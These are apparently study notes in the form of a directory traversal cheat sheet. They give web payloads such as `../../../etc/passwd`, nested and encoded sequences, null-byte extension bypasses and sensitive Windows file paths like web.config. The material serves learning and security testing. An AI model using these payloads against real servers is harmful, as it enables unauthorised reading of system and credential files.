# Directory Traversal

#### `../` - known as sequence

### Using API to fetch images/files

* eg: `/loadimage?filename=219.png == var/www/images`
* Change to filename `=../../../etc/passwd` (in url or POST body)

### Sequences are Stripped

* Use nested sequence (`....//`, `..../`) --> Logic: inner stripping - `.."../"/` or `..".."/`)
* Use encodings, double encodings
  * Url or non-standard (`..%c0%af`, `..%ef%bc%8f`)
  * Payload list (Fuzzing - path traversal)
* Append without sequence (`/etc/passwd`)

### Requires the Filename to begin with Particular String

* Use `var/www/images/../../../etc/passwd`

### Checks the File Extension

* Use null byte (`%00`)
* eg: `var/www/../../../etc/passwd%00.png`

### Windows OS

* `../` and `..\` are valid
* Search for `/windows/win.ini`&#x20;
* C:\inetpub\logs\LogFiles\W3SVC1\\
* C:\inetpub\wwwroot\web.config
* C:\Windows\System32\drivers\etc\hosts

